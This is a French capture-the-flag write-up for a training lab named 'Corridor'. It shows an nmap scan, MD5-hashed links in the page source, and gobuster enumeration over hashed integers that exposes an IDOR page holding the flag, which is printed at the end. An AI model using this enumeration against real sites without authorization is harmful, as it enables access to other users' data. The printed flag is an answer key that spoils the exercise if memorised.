# Corridor

## What is the flag?

### Nmap Scan

```
Nmap scan report for 10.10.68.111
Host is up (0.27s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug httpd 2.0.3 (Python 3.10.2)
|_http-title: Corridor```

### Exploit IDOR

Nous pouvois voir des hash sur le code source de la site inspectons les:

`view-source:http://10.10.245.63/`

```
    <map name="image-map">
        <area target="" alt="c4ca4238a0b923820dcc509a6f75849b" title="c4ca4238a0b923820dcc509a6f75849b" href="c4ca4238a0b923820dcc509a6f75849b" coords="257,893,258,332,325,351,325,860" shape="poly">
        <area target="" alt="c81e728d9d4c2f636f067f89cc14862c" title="c81e728d9d4c2f636f067f89cc14862c" href="c81e728d9d4c2f636f067f89cc14862c" coords="469,766,503,747,501,405,474,394" shape="poly">
        <area target="" alt="eccbc87e4b5ce2fe28308fd9f2a7baf3" title="eccbc87e4b5ce2fe28308fd9f2a7baf3" href="eccbc87e4b5ce2fe28308fd9f2a7baf3" coords="585,698,598,691,593,429,584,421" shape="poly">
        <area target="" alt="a87ff679a2f3e71d9181a67b7542122c" title="a87ff679a2f3e71d9181a67b7542122c" href="a87ff679a2f3e71d9181a67b7542122c" coords="650,658,644,437,658,652,655,437" shape="poly">
        <area target="" alt="e4da3b7fbbce2345d7772b0674a318d5" title="e4da3b7fbbce2345d7772b0674a318d5" href="e4da3b7fbbce2345d7772b0674a318d5" coords="692,637,690,455,695,628,695,467" shape="poly">
        <area target="" alt="1679091c5a880faf6fb5e6087eb1b2dc" title="1679091c5a880faf6fb5e6087eb1b2dc" href="1679091c5a880faf6fb5e6087eb1b2dc" coords="719,620,719,458,728,471,728,609" shape="poly">
        <area target="" alt="8f14e45fceea167a5a36dedd4bea2543" title="8f14e45fceea167a5a36dedd4bea2543" href="8f14e45fceea167a5a36dedd4bea2543" coords="857,612,933,610,936,456,852,455" shape="poly">
        <area target="" alt="c9f0f895fb98ab9159f51fd0297e236d" title="c9f0f895fb98ab9159f51fd0297e236d" href="c9f0f895fb98ab9159f51fd0297e236d" coords="1475,857,1473,354,1537,335,1541,901" shape="poly">
        <area target="" alt="45c48cce2e2d7fbdea1afc51c7c6ad26" title="45c48cce2e2d7fbdea1afc51c7c6ad26" href="45c48cce2e2d7fbdea1afc51c7c6ad26" coords="1324,766,1300,752,1303,401,1325,397" shape="poly">
        <area target="" alt="d3d9446802a44259755d38e6d163e820" title="d3d9446802a44259755d38e6d163e820" href="d3d9446802a44259755d38e6d163e820" coords="1202,695,1217,704,1222,423,1203,423" shape="poly">
        <area target="" alt="6512bd43d9caa6e02c990b0a82652dca" title="6512bd43d9caa6e02c990b0a82652dca" href="6512bd43d9caa6e02c990b0a82652dca" coords="1154,668,1146,661,1144,442,1157,442" shape="poly">
        <area target="" alt="c20ad4d76fe97759aa27a0c99bff6710" title="c20ad4d76fe97759aa27a0c99bff6710" href="c20ad4d76fe97759aa27a0c99bff6710" coords="1105,628,1116,633,1113,447,1102,447" shape="poly">
        <area target="" alt="c51ce410c124a10e0db5e4b97fc2af39" title="c51ce410c124a10e0db5e4b97fc2af39" href="c51ce410c124a10e0db5e4b97fc2af39" coords="1073,609,1081,620,1082,459,1073,463" shape="poly">
    </map>
```

Grâce à crackstation nous avons pu voir que la premère hash est égale à 1. 
J'ai donc crée une wordlist avec toutes les hash puis j'ai lancer gobuster et le résultat est le suivant:

```
/a87ff679a2f3e71d9181a67b7542122c (Status: 200) [Size: 632]
/8f14e45fceea167a5a36dedd4bea2543 (Status: 200) [Size: 632]
/c9f0f895fb98ab9159f51fd0297e236d (Status: 200) [Size: 632]
/1679091c5a880faf6fb5e6087eb1b2dc (Status: 200) [Size: 632]
/eccbc87e4b5ce2fe28308fd9f2a7baf3 (Status: 200) [Size: 632]
/c81e728d9d4c2f636f067f89cc14862c (Status: 200) [Size: 632]
/45c48cce2e2d7fbdea1afc51c7c6ad26 (Status: 200) [Size: 632]
/a87ff679a2f3e71d9181a67b7542122c (Status: 200) [Size: 632]
/c4ca4238a0b923820dcc509a6f75849b (Status: 200) [Size: 632]
/cfcd208495d565ef66e7dff9f98764da (Status: 200) [Size: 797]
/c20ad4d76fe97759aa27a0c99bff6710 (Status: 200) [Size: 632]
/d3d9446802a44259755d38e6d163e820 (Status: 200) [Size: 632]
/6512bd43d9caa6e02c990b0a82652dca (Status: 200) [Size: 632]
```
Nous pouvons voir une différence entre tous ces directory c'est la hash où est écrit Size: 797. En effet cette dir contient le flag que nous cherchons.


*http://10.10.245.63/cfcd208495d565ef66e7dff9f98764da*

**Flag:** `flag{2477ef02448ad9156661ac40a6b8862e}`



